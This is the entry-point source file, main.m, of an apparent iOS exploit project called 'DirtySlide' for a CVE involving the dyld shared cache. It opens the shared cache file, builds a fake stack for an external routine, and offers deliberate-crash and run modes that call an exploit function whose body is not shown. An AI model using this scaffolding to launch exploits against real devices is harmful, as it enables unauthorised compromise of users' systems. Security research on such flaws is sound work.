//
//  main.m
//  DirtySlide
//
//  Created by duy on 7/4/25.
//

@import Darwin;

int minimal_CVE_2026_43724(void);

int cmain(uint64_t *sp0);
__attribute__((no_stack_protector))
int CVE_2026_dyld(void) {
    int fd;
    const char *cache = "/System/Cryptexes/OS/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e";
    fd = open(cache, O_RDONLY, 0);
    if (fd < 0) {
        __builtin_trap();
    }
    
    const int argc = 1;
    char *argv[] = {"DirtySlide", NULL};
    uint64_t sp0[] = {argc, (uint64_t)argv, 0, 0};
    return cmain(sp0);
}

__attribute__((no_stack_protector))
int main(int argc, char *argv[], char *envp[], char *apple[]) {
    if ((argc > 1 && !strcmp(argv[1], "--crash")) || getenv("crash")) {
        uint32_t *crash_buf = (uint32_t *)strcmp;
        *crash_buf = 0;
        return -1;
    } else if ((argc > 1 && !strcmp(argv[1], "--run")) || getenv("run")) {
        _exit(minimal_CVE_2026_43724());
        return -1;
    }
    
    void *uiHandle = dlopen("@executable_path/Frameworks/UI.framework/UI", RTLD_GLOBAL);
    if (uiHandle) {
        // means dsc is loaded
        int (*uiMain)(int argc, char *argv[], char *envp[], char *apple[]) = dlsym(uiHandle, "main");
        return uiMain(argc, argv, envp, apple);
    }
    
    _exit(minimal_CVE_2026_43724());
    return -1;
}
